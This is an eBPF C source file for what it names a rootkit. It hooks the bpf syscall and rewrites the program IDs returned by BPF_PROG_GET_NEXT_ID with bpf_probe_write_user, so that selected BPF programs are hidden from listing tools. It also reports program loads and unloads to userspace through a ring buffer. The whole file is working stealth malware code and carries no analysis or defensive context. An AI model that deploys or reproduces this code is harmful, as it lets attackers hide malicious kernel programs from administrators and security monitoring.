// SPDX-License-Identifier: GPL-2.0
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "rootkit.h"

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_HIDDEN_PROGS);
    __type(key, __u32);
    __type(value, __u32);
} hiding_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, RINGBUF_SIZE);
} event_ringbuf SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_CTX_ENTRIES);
    __type(key, __u64);
    __type(value, struct call_ctx);
} ctx_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} jump_trigger_map SEC(".maps");

SEC("kprobe/__x64_sys_bpf")
int auditor_entry(struct pt_regs *ctx)
{
    struct pt_regs *regs = (struct pt_regs *)PT_REGS_PARM1(ctx);
    unsigned long cmd, uattr;
    
    bpf_probe_read_kernel(&cmd, sizeof(cmd), &regs->di);
    bpf_probe_read_kernel(&uattr, sizeof(uattr), &regs->si);
    
    if ((int)cmd == BPF_PROG_LOAD) {
        struct event_data *evt = bpf_ringbuf_reserve(&event_ringbuf, sizeof(*evt), 0);
        if (evt) {
            evt->action = ACTION_LOAD;
            bpf_ringbuf_submit(evt, 0);
        }
        return 0;
    }
    
    if ((int)cmd == BPF_PROG_GET_NEXT_ID) {
        __u32 start_id = 0;
        if (bpf_probe_read_user(&start_id, sizeof(start_id), (void *)uattr) != 0)
            return 0;
        
        __u32 *jump_to = bpf_map_lookup_elem(&jump_trigger_map, &start_id);
        if (jump_to) {
            bpf_probe_write_user((void *)uattr, jump_to, sizeof(*jump_to));
            return 0;
        }
        
        __u64 pid_tgid = bpf_get_current_pid_tgid();
        struct call_ctx call_ctx = { .uattr_ptr = uattr, .start_id = start_id };
        bpf_map_update_elem(&ctx_map, &pid_tgid, &call_ctx, BPF_ANY);
    }
    
    return 0;
}

SEC("kretprobe/__x64_sys_bpf")
int changer_exit(struct pt_regs *ctx)
{
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct call_ctx *call_ctx = bpf_map_lookup_elem(&ctx_map, &pid_tgid);
    if (!call_ctx)
        return 0;
    
    if (PT_REGS_RC(ctx) != 0) {
        bpf_map_delete_elem(&ctx_map, &pid_tgid);
        return 0;
    }
    
    __u32 returned_id = 0;
    bpf_probe_read_user(&returned_id, sizeof(returned_id), (void *)(call_ctx->uattr_ptr + 4));
    
    __u32 *next_valid_id = bpf_map_lookup_elem(&hiding_map, &returned_id);
    if (next_valid_id) {
        __u32 replacement = *next_valid_id;
        bpf_probe_write_user((void *)(call_ctx->uattr_ptr + 4), &replacement, sizeof(replacement));
    }
    
    bpf_map_delete_elem(&ctx_map, &pid_tgid);
    return 0;
}

// Hook to catch BPF programs unloading using the *somewhat* stable internal function that gets called when a BPF program is unloaded
SEC("kprobe/bpf_prog_put")
int detect_unload(struct pt_regs *ctx)
{
    struct event_data *evt = bpf_ringbuf_reserve(&event_ringbuf, sizeof(*evt), 0);
    if (evt) {
        evt->action = ACTION_UNLOAD;
        bpf_ringbuf_submit(evt, 0);
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
